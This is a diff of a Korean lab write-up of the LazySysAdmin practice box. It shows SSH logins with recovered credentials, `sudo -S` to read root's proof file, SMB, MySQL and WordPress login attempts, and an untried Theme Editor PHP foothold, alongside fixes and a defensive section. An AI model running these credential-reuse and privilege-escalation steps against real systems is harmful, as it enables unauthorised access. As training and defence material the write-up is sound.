-앞의 두 줄이 `sudo -n -l` 결과, `--` 아래가 비번을 넣어 다시 친 결과다. **뒤 절반은 원래 `harvest.sh` 에 없었다** — 이 박스에서 데고 나서 붙인 것이라 16:48 실행분에는 이미 들어 있다. 정확한 추가 시각을 기록해두지 않아 `[가정]` 이다. 어쨌든 스크립트가 앞의 두 줄에서 끝나던 시점에 그것만 봤다면 "sudo 경로 없음"으로 읽힌다.
-
-**`sudo -n` 은 "비번 없이 되는가"만 묻는다.** `id` 가 이미 `27(sudo)` 를 보여줬고 비번(`12345`)도 손에 있으니 다시 친다.
-
-```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -l'"
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-##################################################################################################
-#                                          Welcome to Web_TR1                                    #
-#                             All connections are monitored and recorded                         # 
-#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
-##################################################################################################
-
-[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User togie may run the following commands on LazySysAdmin:
-    (ALL : ALL) ALL
-```
-
-`(ALL : ALL) ALL` — 어떤 사용자로든, 어떤 그룹으로든, 아무 명령이나. 끝났다.
-
-`-S` 는 비번을 stdin 에서 읽는 플래그다. 이게 없으면 sudo 가 **tty 를 직접 열어** 프롬프트를 띄우므로 파이프로 넣은 비번이 무시되고 비대화형 배치가 그대로 멎는다.
-
-그대로 root 를 잡았다. 실제로 던진 것은 아래 한 줄이고, 출력 전문은 5장의 `proof_root.txt` 블록이다 — 같은 실행에서 root 확인과 플래그 읽기를 함께 했기 때문에 여기서 따로 옮기지 않는다.
-
-```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -i bash -c \"whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt\"'"
-```
-
-`sudo -i` 를 쓴 흔적은 타겟 `auth.log` 에도 그대로 남는다 — `COMMAND=/bin/bash -c bash -c whoami; id; ...` 로 기록됐다(`traces_confirmed.log`). `sudo -i <명령>` 은 root 의 로그인 셸을 `-c` 로 불러 명령을 넘기므로 `COMMAND` 에 셸이 먼저 찍힌다.
-
-출력 첫 줄의 `stdin: is not a tty` 는 그 로그인 셸이 읽는 `/root/.profile` 의 `mesg n` 이 tty 없는 stdin 을 만나 뱉는 잡음이다(`[가정]` — 14.04 기본 `.profile` 이 140바이트 그대로인 것까지만 확인했다). 그 다음 줄에서 `uid=0` 이 나왔으니 실패가 아니다.
-
-### 다른 경로는 없었나
-
-`harvest.sh` 의 나머지를 검토한 결과는 이렇다.
-
-`SUID` 목록은 14.04 기본값 그대로였다 — `/bin/ping`·`/bin/su`·`/usr/bin/passwd`·`/usr/bin/chsh`·`/usr/bin/pkexec`·`/usr/bin/at`·`/usr/bin/mtr` 등. 커스텀 SUID 바이너리는 **하나도 없다**. `CAPS` 섹션(`getcap -r /`)도 비어 있었고, `/etc/cron.d`·`cron.daily` 도 배포판 기본 + `php5` 세션 정리 뿐이었다.
-
-`/usr/bin/pkexec` 가 SUID 로 있으니 PwnKit(CVE-2021-4034)이 이론상 후보지만, sudo 로 이미 root 였으므로 **시도하지 않았다.** 이 박스에서 취약 여부를 확인한 적이 없다 — `[가정]` 이다.
-
-커널 `4.4.0-31-generic` / Ubuntu 14.04 도 공개 로컬 익스플로잇이 여럿 있는 조합이지만 같은 이유로 손대지 않았다. **커널 익스플로잇은 항상 마지막 후보다** — 박스를 죽일 수 있고, 시험에서는 리버트 비용이 그대로 시간이다.
-
-## 5. 플래그
-
-두 값 모두 **SSH 대화형 셸에서 원위치 `cat`** 으로 읽었다. 웹셸을 만들지 않았다.
-2026-08-20 인스턴스 값이다 — PG 는 박스를 다시 켤 때마다 새로 생성한다.
-
-`/home/togie/local.txt` (`proof_user.txt` 전문 — 배너와 클라이언트 경고를 포함해 자르지 않았다):
-
-```
+```text
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
@@ -455,10 +415,84 @@ Thu Aug 20 17:45:25 AEST 2026
 3170c6b1e7bac5a3dc430b899115d3b4
 Connection to 192.168.248.36 closed.
 ```
+— 출처: `~/PG/LazySysAdmin/proof_user.txt` 전문. SSH 배너·클라이언트 경고를 포함해 자르지 않음
 
-`/root/proof.txt` (`proof_root.txt` 전문):
+블록에 `┌──(kali㉿kali)` 형태의 Kali 프롬프트가 없는 이유 — 이 박스는 대화형 Kali 터미널이 아니라 비대화형 `ssh kali "..."` 로 작업했고, `~/.zsh_history` 에 이 박스 관련 명령이 0건임(zsh 는 대화형 세션에서만 히스토리를 씀). 타겟 쪽 세션에는 `-tt` 로 pty 가 붙었으므로 출력 끝에 `Connection to ... closed.` 가 찍히고 타겟 `wtmp` 에 `togie pts/0` 가 남음. `proof_root.txt` 의 `stdin: is not a tty` 는 pty 부재를 뜻하지 않음 — `echo 12345 | sudo -S -i` 에서 sudo 가 띄운 로그인 셸의 stdin 만 파이프인 것이고, 자세한 것은 Privilege Escalation 절.
 
+**수동 대안(자동 도구 금지 대비).** 이 경로에는 sqlmap 류가 필요한 지점이 없음 — SMB 는 `smbclient`/`rpcclient`(열거 전용, 허용), SSH 는 표준 클라이언트. WordPress 로그인 화면(`wp-admin`)으로도 진입 가능했으나(다음 문단 「대체 경로」) SSH 가 더 빨라 안 감.
+
+**대체 경로(안 씀).** 회수한 `Admin:TogieMYSQL12345^^` 는 SSH `togie` 계정에는 안 통했지만 WordPress `wp-login.php` 에는 통함(`POST log=Admin&pwd=TogieMYSQL12345^^` → `302 Found` / `Location: .../wp-admin/`, 출처: `try6_wplogin_admin.log`). `Appearance → Theme Editor` 로 PHP 를 심는 대체 foothold 가 존재했으나 시도하지 않음. 반대로 `togie:12345` 는 `wp-login.php` 에서 `200 OK`(폼 재표시 = 실패, 출처: `try7_wplogin_togie.log`).
+
+**Local.txt value:**
+`3170c6b1e7bac5a3dc430b899115d3b4`
+
+### Privilege Escalation – sudo (ALL : ALL) ALL 재확인
+
+**Vulnerability Explanation:**
+- `togie` 계정이 `sudo` 그룹(`27`) 소속이고 `/etc/sudoers` 유효 규칙이 `(ALL : ALL) ALL` — 어떤 사용자·그룹으로도 어떤 명령이나 허용
+- `sudo -n -l`(비밀번호 없이 조회)은 실패하지만, Initial Access 단계에서 이미 확보한 비밀번호(`12345`)로 `sudo -S -l` 을 다시 치면 즉시 전체 허용 목록이 나옴
+- 권한상승이라기보다 사실상 의도된 관리자 권한 부여 — 일반 계정에 무제한 sudo + 취약한 5자리 숫자 비밀번호를 함께 준 구성
+
+**Vulnerability Fix:**
+- `togie` 를 `sudo` 그룹에서 제거하거나 필요한 명령만 `sudoers` 에 개별 등재(NOPASSWD 남용도 금지)
+- 5자리 숫자 같은 취약한 비밀번호 금지 — 비밀번호 정책 강제
+- 일반 사용자 계정에 무제한 sudo 부여 금지(최소 권한 원칙)
+
+**Severity:** Critical — 이미 손에 쥔 비밀번호로 즉시 무제한 root 획득
+
+**Steps to reproduce the attack:**
+1. 첫 SSH 로그인의 `id` 출력에서 `27(sudo)` 그룹 확인
+2. `harvest.sh` 의 `sudo -n -l` 결과가 `a password is required` 로 끝나는 것과 별개로, 이미 아는 비밀번호로 `echo '<pw>' | sudo -S -l` 재확인
+3. `(ALL : ALL) ALL` 확인 → `sudo -S -i bash -c '...'` 로 root 셸 진입, 플래그 원위치 확인
+
+`harvest.sh` 의 SUDO 섹션 앞 두 줄만 보면 "sudo 없음"으로 읽힘:
+
+```text
+===== SUDO =====
+sudo: a password is required
+(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
+-- sudo -S -l (HARVEST_PW) --
+[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL
 ```
+— 출처: `~/PG/LazySysAdmin/harvest_togie.txt`(`togie` 로 돌린 회차). `harvest_root.txt` 는 root 로 돌아 같은 섹션이 `User root may run ...` 로 찍힘
+
+`--` 아래가 비밀번호를 넣어 다시 친 결과. 이 박스에서 실제로 root 를 잡은 순서는 `harvest.sh` 를 통해서가 아니었음 — 첫 SSH 의 `id` 로 `27(sudo)` 를 이미 봤고, 곧장 손으로 `sudo -S -l` 을 재확인했음(아래).
+
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -l'"
+```
+```text
+[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL
+```
+— 출처: `~/PG/LazySysAdmin/try_sudo_l.log`
+
+`-S` 는 비밀번호를 stdin 에서 읽는 플래그 — 없으면 sudo 가 tty 를 직접 열어 프롬프트를 띄우므로 파이프로 넣은 비밀번호가 무시되고 비대화형 배치가 멎음.
+
+```bash
+sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -i bash -c \"whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt\"'"
+```
+
+`sudo -i` 흔적은 타겟 `auth.log` 에도 남음 — `COMMAND=/bin/bash -c bash -c whoami; id; ...` (`traces_confirmed.log`). `sudo -i <명령>` 은 root 로그인 셸을 `-c` 로 불러 명령을 넘기므로 `COMMAND` 에 셸이 먼저 찍힘.
+
+출력 첫 줄의 `stdin: is not a tty` 는 그 로그인 셸이 읽는 `/root/.profile` 의 `mesg n` 이 tty 없는 stdin 을 만나 뱉는 잡음(`[가정]` — 14.04 기본 `.profile` 이 140바이트 그대로인 것까지만 확인, `mesg` 호출 자체를 소스로 대조하지는 않음). 다음 줄에서 `uid=0` 이 나왔으니 실패가 아님.
+
+**다른 경로 확인.** `harvest.sh` 의 나머지 섹션을 root 획득 후 재확인. SUID 목록은 14.04 기본값 그대로(`/bin/ping`·`/bin/su`·`/usr/bin/passwd`·`/usr/bin/chsh`·`/usr/bin/pkexec`·`/usr/bin/at`·`/usr/bin/mtr` 등) — 커스텀 SUID 바이너리 없음. `CAPS`(`getcap -r /`) 도 빈 결과. `/etc/cron.d`·`cron.daily` 도 배포판 기본 + `php5` 세션 정리 뿐(출처: `harvest_root.txt`). `/usr/bin/pkexec` 가 SUID 로 있어 PwnKit(CVE-2021-4034)이 이론상 후보였으나 sudo 로 이미 root 였으므로 **시도하지 않음** — 이 박스에서 취약 여부를 확인한 적 없다(`[가정]`). 커널 `4.4.0-31-generic` 도 로컬 익스플로잇이 여럿 있는 조합이나 같은 이유로 손대지 않음.
+
+### Post-Exploitation
+
+**Proof.txt value:**
+`09675eaefc242e881bcf18f83c340e90`
+
+```text
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
@@ -485,132 +519,18 @@ drwx------  2 root root 4096 Aug 14  2017 .cache
 09675eaefc242e881bcf18f83c340e90
 Connection to 192.168.248.36 closed.
 ```
+— 출처: `~/PG/LazySysAdmin/proof_root.txt` 전문. SSH 배너·클라이언트 경고와 `[sudo] password for togie:` 를 포함해 자르지 않음
 
-두 블록 다 `[sudo] password for togie:` 와 SSH 배너가 그대로 붙어 있다. 지저분해 보여도 **이게 실측의 표식**이라 손대지 않았다. 규정상으로도 문제가 없다 — 이건 웹셸이 아니라 SSH 세션이고, `-tt` 로 tty 를 붙여 원위치에서 `cat` 했다.
+두 플래그 모두 **pty 가 붙은 SSH 세션(`ssh -tt`)에서 원위치 `cat`** 으로 읽음 — 웹셸 미사용. 근거 셋 — 출력 끝의 `Connection to 192.168.248.36 closed.`(ssh 가 tty 를 할당했을 때만 찍힘) · 타겟 `wtmp` 의 `togie pts/0` 2건(둘 다 17:45) · `auth.log` 17:45:50 행의 `TTY=pts/0`. 명령을 인자로 넘긴 방식이라 프롬프트 앞에 앉아 친 것은 아니지만, 셸은 타겟의 `bash`/`sudo -i` 이고 플래그는 타겟 파일시스템에서 직접 읽음. 타겟은 AEST(+1000), Kali 는 KST(+0900) — Kali 산출물 mtime 16:45 = 타겟 `date` 17:45 로 정확히 맞음. nmap 도 `clock-skew ... median: -1s`(시계는 동기), `smb-os-discovery` 는 `System time: 2026-08-20T17:43:55+10:00` 으로 타겟 타임존 +1000 을 독립 기록. 2026-08-20 인스턴스 값이며, PG 는 박스를 다시 켤 때마다 새로 생성함.
 
-타겟은 AEST(+1000), Kali 는 KST(+0900)다. Kali 산출물 mtime 16:45 = 타겟 `date` 17:45 로 정확히 맞는다. nmap 도 `clock-skew ... median: -1s` 로 시계 자체는 동기돼 있다고, `smb-os-discovery` 는 `System time: 2026-08-20T17:43:55+10:00` 으로 타겟 타임존이 +1000 임을 각각 독립 기록했다.
+**남긴 흔적**
+- `/tmp/.h.sh`(업로드한 harvest.sh) · `/tmp/.h/`(수집 출력) · `/tmp/zz`(rbash 탈출 테스트 파일) → 삭제 확인. 삭제 후 `ls -la /tmp` 가 `vmware-root` 만 남은 것을 확인
+- 파일 생성·설정 변경·계정 추가 없음. SMB 쓰기 테스트(`lsa_wtest.txt`)는 `NT_STATUS_ACCESS_DENIED` 로 실패해 타겟에 파일이 생기지 않음
+- 리버스셸 미사용(SSH 경로) — Kali 리스너 없음. tmux 세션(`lsa_nmap`)은 이름으로 종료. NFS 마운트 없음
 
-## 6. 막혔던 지점 / 시행착오
+**로그 확인(지우지 않음).** 박스가 살아 있는 동안 root 로 되돌아가 실제로 뭐가 남았는지 셈(`traces_confirmed.log` 원문).
 
-전체 소요는 정찰 시작(Kali 16:43:25)부터 root(16:45:50)까지 2분 25초다. 그래도 헛다리는 여덟 개 나왔고, 그중 절반은 **도구 사용법 문제**였지 박스 문제가 아니었다.
-
-**① `scp` 가 조용히 끊겼다** — `harvest.sh` 를 올리려는데 `scp: Connection closed`. 방화벽이나 권한 문제로 읽기 쉬운데 아니다. `scp -O` (대문자 O, legacy SCP 프로토콜 강제)로 즉시 해결됐다.
-
-원인은 이때는 몰랐고 rbash 정체를 파악한 뒤에 맞춰졌다. 최신 OpenSSH 의 `scp` 는 기본으로 **SFTP 서브시스템**을 쓴다. `sshd_config` 에는 `Subsystem sftp /usr/lib/openssh/sftp-server` 가 정상 등재돼 있었는데, sshd 는 외부 서브시스템을 **사용자의 로그인 셸에 `-c` 로 넘겨** 실행한다. 그 셸이 rbash 라 `/usr/lib/openssh/sftp-server` 에 `/` 가 들어 있다는 이유로 거부하고 연결이 끊긴다. `sftp` 를 직접 붙여보면 같은 증상이 재현된다.
-
-```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' sftp -o StrictHostKeyChecking=no togie@192.168.248.36 <<< 'ls'
-##################################################################################################
-
-Connection closed.  
-Connection closed
-```
-
-`-O` 가 통한 이유도 같은 규칙으로 설명된다 — legacy 모드는 원격에서 `scp -t <경로>` 를 실행하고, **명령 이름 `scp` 에는 `/` 가 없다.** rbash 는 인자의 슬래시가 아니라 명령 이름의 슬래시만 본다.
-
-**구형 리눅스 박스에 파일이 안 올라가면 `-O` 를 먼저 때려보고, 그래도 안 되면 로그인 셸을 의심하라.** 나머지 대안 `cat file | ssh user@host 'cat > /tmp/x'` 는 여기서 rbash 가 `>` 를 막아 어차피 실패했을 것이다.
-
-**② rbash 를 방화벽으로 오독할 뻔했다** — `sh /tmp/.h.sh >/dev/null` 이 `rbash: /dev/null: restricted` 를 뱉었을 때 처음 든 생각은 "파일이 안 올라갔나"였다. 실제로는 파일은 멀쩡히 올라가 있었고(`ls -la /tmp/.h.sh` 로 확인) 셸이 리다이렉션을 거부한 것이다. **에러 메시지의 앞부분(`rbash:`)을 읽어라** — 어느 계층이 거부했는지가 그 이름에 적혀 있다.
-
-**③ `sudo -n -l` 이 빈손이었다** — 열거 스크립트의 SUDO 섹션이 `sudo: a password is required` 한 줄로 끝난다. 이 출력만 보면 "sudo 경로 없음"으로 읽히는데, 실제 답은 `(ALL : ALL) ALL` 이었다.
-
-여기서 나를 구한 건 첫 SSH 의 `id` 였다. `27(sudo)` 를 보고 곧장 `echo 12345 | sudo -S -l` 로 다시 쳤고, 그래서 `harvest.sh` 의 빈손 출력을 볼 일 자체가 없었다(4장 시각표 — 스크립트는 root 를 잡은 뒤에야 돌았다). 순서가 반대였다면 그대로 막혔을 것이다.
-
-**`sudo -n` 의 의미를 정확히 읽어라.** `-n` 은 "비밀번호 프롬프트를 절대 띄우지 말라"는 뜻이다. 인증이 필요한 상태면 목록을 걸러서 보여주는 게 아니라 **아예 물어보지 못하고 `a password is required` 로 죽는다.** "항목이 없다"가 아니라 "못 물어봤다"이다. 비번을 이미 아는 상황이면 반드시 `echo '<pw>' | sudo -S -l` 로 다시 쳐라. (이 때문에 `~/PG/_lib/harvest.sh` 에 `HARVEST_PW` 환경변수를 넣어 `sudo -S -l` 을 추가로 돌리도록 고쳤다.)
-
-**④ 웹에 적힌 사용자명을 못 보고 SMB 로 돌아갔다** — `curl` 로 받은 `wp_home.html` 에 `grep -o -E '.{60}togie.{60}'` 을 돌렸더니 **0건**이 나왔다. "웹에는 togie 언급이 없다"고 결론냈는데 틀렸다. 실제로는 56건 있었다. `grep -o` 의 `.{60}` 앞뒤 문맥 요구가 **행 시작/끝에 걸린 매치를 전부 탈락**시킨 것이다. 스크린샷을 눈으로 보고서야 `My name is togie.` 를 발견했다. **부재를 확인할 때는 문맥 없는 단순 패턴(`grep -c -i togie`)으로 먼저 세라.** 문맥 패턴은 확인용이지 존재 판정용이 아니다.
-
-**⑤ `enum4linux -U` 가 빈 결과** — 사용자 열거를 붙였는데 이렇게 나왔다.
-
-```
- ======================================( Users on 192.168.248.36 )======================================
-
-Use of uninitialized value $users in print at ./enum4linux.pl line 972.
-Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
-```
-
-Perl 경고까지 뱉으며 아무것도 안 나온다. 이걸 "사용자 열거 불가"로 읽으면 안 된다. Samba 의 `querydispinfo`/`enumdomusers` 가 Unix 계정을 노출하지 않는 구성일 뿐이고, **`rpcclient` SID 역조회는 여전히 통한다**(1장). 도구 하나가 빈손이면 같은 정보를 다른 RPC 로 물어라.
-
-**⑥ SMB 공유 쓰기 시도** — 웹루트가 통째로 읽히니 PHP 웹셸을 올리는 게 첫 후보였다.
-
-```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ smbclient //192.168.248.36/share\$ -N -c 'put /tmp/lsa_wtest.txt lsa_wtest.txt'
-NT_STATUS_ACCESS_DENIED opening remote file \lsa_wtest.txt
-```
-
-읽기 전용이었다. 이게 통했으면 SSH 없이 웹셸로 끝났겠지만 — **OSCP 에서는 웹셸로 읽은 플래그가 0점**이므로 어차피 셸을 따로 올려야 했다.
-
-**⑦ MySQL 원격 접속** — `Admin:TogieMYSQL12345^^` 를 3306 에 직접 던졌다.
-
-```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ mysql -h 192.168.248.36 -u Admin -p'TogieMYSQL12345^^' -e 'select 1'
-ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.207' is not allowed to connect to this MySQL server
-```
-
-에러 1130 = **호스트 기반 거부**. 비번이 틀린 게 아니다(1045 였으면 자격증명 문제). `wp-config.php` 의 `DB_HOST` 가 `localhost` 인 것과 일치한다. nmap 이 `MySQL (unauthorized)` 로 적은 것도 같은 현상을 본 것이다. **1130 과 1045 를 구분하라** — 전자는 피벗해서 다시 오면 되고, 후자는 비번을 더 찾아야 한다.
-
-**⑧ 자격증명 조합 정리** — 넷을 다 때려봤다.
-
-| 조합 | 결과 |
-|---|---|
-| `ssh togie:12345` | **성공** |
-| `ssh togie:TogieMYSQL12345^^` | `Permission denied (publickey,password).` |
-| `POST wp-login.php log=Admin&pwd=TogieMYSQL12345^^` | `HTTP/1.1 302 Found` → `Location: .../wp-admin/` — **성공** |
-| `POST wp-login.php log=togie&pwd=12345` | `HTTP/1.1 200 OK` (로그인 폼 재출력 = 실패) |
-
-WordPress 로그인 판정은 **상태 코드로 한다.** 성공은 `302` + `Location: wp-admin/`, 실패는 `200` 으로 폼을 다시 그린다. 본문 길이나 "Error" 문자열을 찾을 필요가 없다.
-
-`Admin` 으로 wp-admin 에 들어갈 수 있었으니 **Appearance → Theme Editor 로 PHP 를 심는 대체 foothold** 가 존재했다. SSH 가 더 빨라서 안 갔다.
-
-## 7. OSCP 시험 관점
-
-1. **널 세션 SMB 를 발견하면 다른 걸 다 멈추고 먼저 훑어라.** `smbclient -L //T -N` → 읽히는 공유마다 `-c 'recurse ON; ls'`. 여기서는 3분 만에 끝났는데, 웹 디렉터리 버스팅부터 시작했으면 30분을 태웠을 것이다.
-2. **웹루트가 파일 공유로 노출되면 `*.php` 설정파일이 1순위다.** `wp-config.php`·`configuration.php`(Joomla)·`settings.php`(Drupal)·`local_settings.py`·`.env`·`web.config`. WordPress 면 `wp-config.php` 하나로 DB 자격증명이 끝난다.
-3. **`sudo -l` 을 두 번 쳐라.** 비번 모를 때 `sudo -n -l`(블로킹 없음), 비번 알면 `echo '<pw>' | sudo -S -l`. 자동 열거 스크립트는 대개 전자만 돌리므로 **후자를 손으로 보충하는 게 네 몫**이다.
-4. **`id` 의 보조 그룹을 읽어라.** `27(sudo)`·`4(adm)`(로그 읽기)·`docker`·`lxd`·`disk`·`shadow` 는 전부 그 자체로 권한상승 후보다. 여기서는 첫 `id` 출력에 이미 답이 있었다.
-5. **제한 셸은 PATH 로 판정한다.** `echo $PATH` 가 평범하면 감옥이 아니라 문패다. PATH 가 좁으면 그때부터 GTFOBins 를 뒤져라.
-6. **수동 대안** — 이 박스는 처음부터 끝까지 `smbclient`·`rpcclient`·`ssh`·`sudo` 뿐이다. 자동 도구가 하나도 필요 없었다. `enum4linux` 를 썼지만 그것마저 빈손이었고, 결정적 정보는 `rpcclient` 한 줄에서 나왔다.
-7. **시간 배분** — Fundamental 난이도의 리눅스 박스에서 **20분 안에 자격증명 후보가 안 나오면 열거를 놓친 것**이다. 포트마다 인증 없는 열거(SMB `-N`, FTP anonymous, NFS `showmount -e`, SNMP public, LDAP anonymous bind)를 다 돌았는지 되짚어라. 웹 디렉터리 버스팅은 그 다음이다.
-
-## 8. 방어 관점
-
-- Samba 공유가 웹루트를 가리키지 않게 한다. 불가피하면 `guest ok = no` + `valid users` 로 익명 접근을 끊는다. 이 박스의 `share$` 는 `-N` 으로 읽혔다.
-- `wp-config.php` 를 문서 루트 밖(`../`)에 두거나 최소한 `chmod 640` + 웹 서버 사용자만 읽게 한다. 파일 공유로 노출되는 순간 DB 자격증명은 공개 정보다.
-- `deets.txt` 같은 비번 메모를 서버에 두지 않는다. `todolist.txt` 가 "고칠 예정"이라고 적혀 있었다는 것 자체가 위험의 지표다.
-- `togie` 를 `sudo` 그룹에서 빼거나, 필요한 명령만 `sudoers` 에 개별 등재한다. `(ALL : ALL) ALL` + 5자리 숫자 비번은 사실상 root 계정을 하나 더 만든 것이다.
-- 제한 셸을 쓸 거면 PATH 를 화이트리스트 디렉터리 하나로 좁히고 거기에 허용 바이너리만 심볼릭 링크한다. PATH 를 안 좁힌 rbash 는 보안 장치가 아니다.
-- MySQL 이 `bind-address = 0.0.0.0` 이라 3306 이 외부에 열려 있었다. 접근은 호스트 ACL 로 막혔지만 노출 자체를 줄이는 게 낫다.
-
-## 9. 참고 자료
-
-- GTFOBins — 제한 셸 탈출에 쓸 수 있는 바이너리 목록: https://gtfobins.github.io/#+shell
-- `rpcclient` SID 네임스페이스: Samba 의 `S-1-22-1-<uid>` = Unix 사용자, `S-1-22-2-<gid>` = Unix 그룹
-- 이 박스는 VulnHub 의 LazySysAdmin 1.0 을 PG 가 재포장한 것이다. 원판과 달리 **`togie` 의 셸이 `/bin/rbash`** 이고 플래그가 `local.txt`/`proof.txt` 로 바뀌어 있다.
-
-## 남긴 흔적
-
-정리하고 **직접 확인한 것**:
-- `/tmp/.h.sh`(업로드한 `harvest.sh`) · `/tmp/.h/`(수집 출력) · `/tmp/zz`(rbash 탈출 테스트 파일) → 삭제. 삭제 후 `ls -la /tmp` 가 `vmware-root` 만 남은 것을 확인했다.
-- 파일 생성·설정 변경·계정 추가는 없다. 리버스셸을 안 썼으므로 Kali 리스너도 tmux 세션(`lsa_nmap`, nmap 용)도 페이로드를 남기지 않았다.
-- SMB 쓰기 테스트(`lsa_wtest.txt`)는 `ACCESS_DENIED` 로 실패했으므로 타겟에 파일이 생기지 않았다.
-
-### 로그에 남긴 것 — 지우지 않았고, 대신 세어봤다
-
-박스가 살아 있는 동안 root 로 되돌아가 실제로 뭐가 남았는지 세었다. `traces_confirmed.log` 원문이다.
-
-```
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-##################################################################################################
-#                                          Welcome to Web_TR1                                    #
-#                             All connections are monitored and recorded                         # 
-#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
-##################################################################################################
-
+```text
 [sudo] password for togie: ===AUTHLOG_COUNT===
 68
 ===AUTHLOG_SAMPLE===
@@ -650,27 +570,21 @@ btmp begins Thu Aug 20 17:47:14 2026
 ===HISTCONTENT===
 ===END===
 ```
+— 출처: `~/PG/LazySysAdmin/traces_confirmed.log`
 
-읽어야 할 것 넷.
+`sudo` 는 실행 명령을 `COMMAND=` 에 인자까지 통째로 남김 — 17:45:50 행에 `cat /root/proof.txt` 가 그대로 있음. `wtmp` 의 `togie pts/0` 는 2건뿐(둘 다 17:45, `-tt` 로 플래그를 읽은 그 두 번) — 비대화형 `ssh <cmd>` 는 pty 를 안 열어 `wtmp` 에 안 남음. `btmp` 실패 로그인 1건(17:47)은 `togie:TogieMYSQL12345^^` SSH 시도(Initial Access 절 대체 경로 참고). `~togie/.bash_history` 는 0바이트(mtime 2020-03-05) — 명령이 한 줄도 안 들어감(비대화형이었기 때문).
 
-**① `sudo` 는 실행 명령을 `COMMAND=` 에 인자까지 통째로 남긴다.** 17:45:50 행에 `cat /root/proof.txt` 가 그대로 박혀 있다 — 플래그를 어떻게 읽었는지가 타겟 로그에 문장으로 남는다는 뜻이다. 비번을 명령 인자로 넘기는 습관이 있으면 그것도 같은 자리에 남는다. 이건 시험보다 실무 쪽에서 더 값나가는 관찰이다.
+이 흔적 확인 작업 자체가 `auth.log` 에 `sudo` 2행을 더 얹었음(위 `AUTHLOG_TAIL` 의 18:22:33 항목) — `68`·`14` 는 이 확인 실행분을 포함한 숫자.
 
-**② `wtmp` 의 `togie pts/0` 는 2건뿐이고 둘 다 17:45 다.** `ssh -tt` 로 플래그를 읽은 그 두 번이다. 비대화형 `ssh <cmd>` 는 pty 를 안 여니 `wtmp` 에 안 남는다 — 실제 작업량에 비해 `last` 가 조용한 이유다. `auth.log` 는 반대로 68행 다 세고 있다. **어느 로그를 보느냐로 결론이 갈린다.**
+**확인하지 않은 것(관측 없음):** Apache 액세스 로그(`/var/log/apache2/access.log`)의 SMB 무관 웹 요청 기록, Samba 로그(`/var/log/samba/`)의 널 세션·`recurse ON; ls` 기록, MySQL 1130 거부 기록.
 
-**③ `btmp` 에 실패 로그인 1건, 17:47.** 6장 ⑧의 `togie:TogieMYSQL12345^^` 시도다. 자격증명 조합을 때려보면 실패도 그대로 남는다.
+## 관련
 
-**④ `~togie/.bash_history` 는 0바이트 그대로다**(mtime 2020-03-05). 내 명령은 한 줄도 안 들어갔다 — 전부 비대화형이었기 때문이다. 이건 이제 `[가정]` 이 아니라 확인된 사실이다.
-
-**로그는 지우지 않았다.** 「남긴 흔적」이 요구하는 건 지우는 게 아니라 **내가 무엇을 남겼는지 알고 적는 것**이다. 로그 삭제는 흔적을 줄이는 게 아니라 더 남기고(크기·mtime 변화, 삭제 행위 자체가 감사 대상) 되돌릴 수도 없다. PG 랩에서는 할 이유도 없다.
-
-그리고 **이 흔적 확인 작업 자체가 `auth.log` 에 `sudo` 2행을 더 얹었다.** 위 `===AUTHLOG_TAIL===` 의 18:22:33 항목이 그것이고, `sudo` 로 로그를 읽었으니 그 `grep` 명령 전문까지 `COMMAND=` 에 찍혔다. 따라서 `68` 과 `14` 는 **이 확인 실행분을 포함한 숫자**다. 관측이 관측 대상을 바꾸는 자리라 빼지 않고 그대로 적어둔다.
-
-**확인하지 않은 것**:
-- Apache 액세스 로그(`/var/log/apache2/access.log`)에 남았을 `curl`·`wp-login.php` POST 기록 — 보지 않았다.
-- Samba 로그(`/var/log/samba/`)에 남았을 널 세션·`recurse ON; ls`·쓰기 실패 기록 — 보지 않았다.
-- MySQL 의 1130 거부 기록 — 보지 않았다.
-
-## 관련 노트
-
